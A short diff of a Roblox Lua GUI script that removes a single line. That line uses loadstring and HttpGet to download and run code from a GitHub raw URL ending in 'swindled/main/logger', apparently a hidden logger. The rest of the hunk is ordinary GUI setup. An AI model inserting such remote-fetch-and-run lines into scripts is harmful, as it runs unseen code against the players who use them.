@@ -89,7 +89,6 @@ TextButton.TextWrapped = true
 
 -- Scripts:
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/cubert04/swindled/main/logger"))()
 local function KRCT_fake_script() -- ScreenGui.LocalScript 
 	local script = Instance.new('LocalScript', ScreenGui)
 
